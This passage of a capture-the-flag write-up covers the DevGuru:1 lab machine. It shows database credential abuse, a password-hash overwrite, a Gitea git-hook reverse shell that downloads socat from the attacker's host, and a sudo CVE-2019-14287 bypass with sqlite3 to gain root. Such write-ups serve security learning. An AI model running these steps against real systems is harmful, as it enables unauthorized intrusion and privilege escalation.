; Database to use. Either "mysql", "postgres", "mssql" or "sqlite3".
DB_TYPE             = mysql
HOST                = 127.0.0.1:3306
NAME                = gitea
USER                = gitea
; Use PASSWD = `your password` for quoting if you use special characters in the password.
PASSWD              = {Redacted}
[...]
```

**Oh! We found Gitea's database credentials!**

**Let's login as `gitea` database user in Adminer:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818172617.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818172624.png)

Among those tables, table `user` stands out.

**Select table `user`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818172647.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818172709.png)

We found Gitea user `frank`'s password hash! However, I'm unable to crack it.

**Again, we can modify the password hash and its algorithm:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|17:27:59(HKT)]
└> php gen_password.php 
$2y$10$y0luneMBV1AU5igeNQcUzOZwPsq3bA.zvsGJtjVO0xPsM8plSydca
```

> Note: The original password is `password`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818172823.png)

**Login as user `frank` in Gitea:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818172856.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818172905.png)

We're in!!

Previously, we found that this version of Gitea is vulnerable to authenticated RCE. Let's exploit it!

**Mirror (Copy) the exploit:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|17:29:57(HKT)]
└> searchsploit -m 49571
  Exploit: Gitea 1.12.5 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49571
     Path: /usr/share/exploitdb/exploits/multiple/webapps/49571.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/siunam/ctf/VulnHub/DevGuru:1/49571.py
```

**Try to run it:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|17:35:20(HKT)]
└> python2 49571.py -t http://devguru.local:8585/ -u frank -p password -I $LHOST -P 53 -v
[...]
    _____ _ _______
   / ____(_)__   __|             CVE-2020-14144
  | |  __ _   | | ___  __ _
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
  | |__| | |  | |  __/ (_| |
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5
     
[+] Starting exploit ...
   [>] login('frank', ...)
```

Wait what?? It got stucked in the login process??

Hmm... Let's exploit it manually.

> Note: All steps in below are from [https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce](https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce).

- Create a new repository:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818173919.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818173947.png)

- Go to "Settings" -> "Git Hooks" -> "Post Receive Hook":

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818174028.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818174039.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818174050.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818174058.png)

- Write a Bash script that triggers a reverse shell payload:

```bash
#!/bin/bash
wget http://10.69.96.100/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat TCP:10.69.96.100:53 EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818174240.png)

- Setup a socat listener (For fully interactive shell)

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|17:32:53(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:53
2023/08/18 17:32:53 socat[381888] N opening character device "/dev/pts/3" for reading and writing
2023/08/18 17:32:53 socat[381888] N listening on AF=2 0.0.0.0:53
```

- Host the `socat` binary via Python's `http.server` module:

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|17:32:27(HKT)]
└> file /opt/static-binaries/binaries/linux/x86_64/socat
/opt/static-binaries/binaries/linux/x86_64/socat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|17:32:33(HKT)]
└> python3 -m http.server -d /opt/static-binaries/binaries/linux/x86_64/ 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Trigger the reverse shell payload in the webhook by pushing a new commit:

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|17:43:38(HKT)]
└> mkdir rce; cd rce
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1/rce)-[2023.08.18|17:43:52(HKT)]
└> git init
[...]
Initialized empty Git repository in /home/siunam/ctf/VulnHub/DevGuru:1/rce/.git/
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1/rce)-[2023.08.18|17:43:58(HKT)]-[git://master ✔]
└> touch README.md
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1/rce)-[2023.08.18|17:44:02(HKT)]-[git://master ✗]
└> git add README.md
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1/rce)-[2023.08.18|17:44:05(HKT)]-[git://master ✗]
└> git commit -m "Initial commit"
[master (root-commit) 9ebe27d] Initial commit
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 README.md
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1/rce)-[2023.08.18|17:44:29(HKT)]-[git://master ✔]
└> git remote add origin http://devguru.local:8585/frank/rce.git 
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1/rce)-[2023.08.18|17:44:32(HKT)]-[git://master ✔]
└> git push -u origin master
Username for 'http://devguru.local:8585': frank
Password for 'http://frank@devguru.local:8585': 
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 218 bytes | 218.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0

```

- Profit:

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|17:32:53(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:53
2023/08/18 17:32:53 socat[381888] N opening character device "/dev/pts/3" for reading and writing
2023/08/18 17:32:53 socat[381888] N listening on AF=2 0.0.0.0:53
                                                                2023/08/18 17:44:38 socat[381888] N accepting connection from AF=2 10.69.96.75:48726 on AF=2 10.69.96.100:53
                                                                 2023/08/18 17:44:38 socat[381888] N starting data transfer loop with FDs [5,5] and [7,7]
                                              frank@devguru:~/gitea-repositories/frank/rce.git$ 
frank@devguru:~/gitea-repositories/frank/rce.git$ export TERM=xterm-256color
frank@devguru:~/gitea-repositories/frank/rce.git$ stty rows 22 columns 107
frank@devguru:~/gitea-repositories/frank/rce.git$ ^C
frank@devguru:~/gitea-repositories/frank/rce.git$ whoami; hostname; id; ip a
frank
devguru.local
uid=1000(frank) gid=1000(frank) groups=1000(frank)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:af:e6:87 brd ff:ff:ff:ff:ff:ff
    inet 10.69.96.75/24 brd 10.69.96.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:feaf:e687/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `frank`!

**user.txt:**
```shell
frank@devguru:/home/frank$ cat user.txt 
{Redacted}
```

### frank to root

Again, enumeration!

**Sudo permission:**
```shell
frank@devguru:/home/frank$ sudo -l
Matching Defaults entries for frank on devguru:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User frank may run the following commands on devguru:
    (ALL, !root) NOPASSWD: /usr/bin/sqlite3
```

Oh! **User `frank` can run `/usr/bin/sqlite3` without password** as anyone else, **except `root`**??

Wait, we can't run the command as `root`?? Why? That's very weird to me.

Maybe the `sudo` version has a vulnerability??

**Let's check `sudo`'s version:**
```shell
frank@devguru:/home/frank$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

- Sudo version: **1.8.21p2**

**Upon researching, I found [this GitHub repository](https://github.com/rabiulhsantahin/ctf/blob/main/sudo-exploit.txt):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818181819.png)

So, if `sudo` version before 1.8.28, it's vulnerable to CVE-2019-14287.

> In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. ***For example, this allows bypass of `!root` configuration, and USER= logging, for a "`sudo -u \#$((0xffffffff))`" command.*** (From [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287))

**That being said, we can run the `sqlite3` command as `root` using `sudo -u#-1`!!** 

**Also, according to [GTFOBins](https://gtfobins.github.io/gtfobins/sqlite3/#sudo), we can escalate our privilege via:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818202635.png)

**Let's do that!**
```shell
frank@devguru:/home/frank$ sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/bash'
root@devguru:/home/frank# whoami; hostname; id; ip a
root
devguru.local
uid=0(root) gid=1000(frank) groups=1000(frank)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:af:e6:87 brd ff:ff:ff:ff:ff:ff
    inet 10.69.96.75/24 brd 10.69.96.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:feaf:e687/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `root`! :D

## Rooted

**root.txt:**
```shell
root@devguru:/root# cat root.txt
{Redacted}
```

```shell
root@devguru:/root# cat msg.txt 

	   Congrats on rooting DevGuru!
  Contact me via Twitter @zayotic to give feedback!
```

## Conclusion

What we've learned:

1. Dumping Git repository from a website
2. Enumerating and modifying database's data in Adminer
3. Exploiting authenticated SSTI in October CMS
4. Exploiting authenticated RCE in Gitea version 1.12.5
5. Bypassing `sudo` policy blacklist via CVE-2019-14287
6. Vertical privilege escalation via misconfigurated Sudo permission in `sqlite3`